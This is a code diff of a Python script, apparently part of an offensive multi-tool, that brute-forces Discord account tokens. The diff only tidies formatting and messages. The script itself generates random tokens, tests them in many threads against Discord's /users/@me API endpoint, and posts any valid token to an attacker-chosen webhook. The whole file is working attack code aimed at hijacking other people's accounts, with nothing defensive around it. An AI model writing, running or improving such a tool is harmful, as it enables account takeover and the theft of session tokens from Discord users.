@@ -1,4 +1,4 @@
-# Copyright (c) 2025 v4lkyr0/v4lkyr_
+# Copyright (c) 2025 v4lkyr0
 # See LICENSE file for details
 
 from Plugins.Utils import *
@@ -20,11 +20,11 @@ try:
     webhook = ChoiceWebhook()
 
     try:
-        threads_number = int(input(f"{INPUT} Threads Number {red}->{white} ").strip())
+        threads_number = int(input(f"{INPUT} Threads Number {red}->{reset} ").strip())
     except:
         ErrorNumber()
 
-    print(f"{LOADING} Generate Tokens..", reset)
+    print(f"{LOADING} Generating Tokens..", reset)
 
     def SendWebhook(embed_content):
         payload = {
@@ -32,27 +32,22 @@ try:
             'username': username_webhook,
             'avatar_url': avatar_webhook
         }
-        headers = {'Content-Type': 'application/json'}
-
-        requests.post(webhook, data=json.dumps(payload), headers=headers)
+        requests.post(webhook, data=json.dumps(payload), headers={'Content-Type': 'application/json'})
 
     def TokenCheck():
-        first_part  = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([24, 26])))
-        second_part = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([6])))
-        third_part  =  ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([38])))
-        token = f"{first_part}.{second_part}.{third_part}"
+        first_part  = ''.join(random.choice(string.ascii_letters + string.digits + '-_') for _ in range(random.choice([24, 26])))
+        second_part = ''.join(random.choice(string.ascii_letters + string.digits + '-_') for _ in range(6))
+        third_part  = ''.join(random.choice(string.ascii_letters + string.digits + '-_') for _ in range(38))
+        token       = f"{first_part}.{second_part}.{third_part}"
 
         try:
-            response = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}).json()
+            response = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token})
             if response.status_code == 200:
                 embed_content = {
                     "title": "Token found!",
                     "description": f"**Token:**\n```{token}```",
                     "color": color_embed,
-                    "footer": {
-                        "text": username_webhook,
-                        "icon_url": avatar_webhook
-                    }
+                    "footer": {"text": username_webhook, "icon_url": avatar_webhook}
                 }
                 SendWebhook(embed_content)
                 print(f"{SUCCESS} Status:{red} Valid   {white}| Token:{red} {token}", reset)
@@ -64,13 +59,12 @@ try:
     def Request():
         threads = []
         try:
-            for _ in range(int(threads_number)):
+            for _ in range(threads_number):
                 t = threading.Thread(target=TokenCheck)
-                threads.append(t)
                 t.start()
+                threads.append(t)
         except:
             ErrorNumber()
-
         for thread in threads:
             thread.join()
 
